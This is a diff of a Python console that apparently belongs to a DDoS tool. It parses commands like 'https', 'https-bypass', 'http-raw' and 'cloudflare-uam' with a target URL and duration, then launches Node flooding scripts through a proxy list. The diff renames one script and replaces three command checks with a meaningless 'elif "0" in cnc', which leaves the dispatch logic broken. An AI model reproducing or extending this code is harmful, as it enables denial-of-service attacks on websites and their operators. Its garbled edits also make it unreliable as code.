@@ -261,7 +261,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node tlsx.js {url} {time} 32 10 proxy.txt')
+                os.system(f'node https.js {url} {time} 32 10 proxy.txt')
             except IndexError:
                 print('Usage: https <url> <time>')
                 print('Example: https http://example.com 60')
@@ -272,7 +272,7 @@ def main():
             except IndexError:
                 print('proxy recieved')
 
-        elif "https-bypass" in cnc:
+        elif "0" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
@@ -281,7 +281,7 @@ def main():
                 print('Usage: https-bypass <url> <time>')
                 print('Example: https-bypass http://example.org 20')
 
-        elif "http-raw" in cnc:
+        elif "0" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
@@ -291,7 +291,7 @@ def main():
                 print('Usage: https-raw <url> <time> <GET/POST/HEAD>')
                 print('Example: http-raw http://example.com 20 POST')
 
-        elif "cloudflare-uam" in cnc:
+        elif "0" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
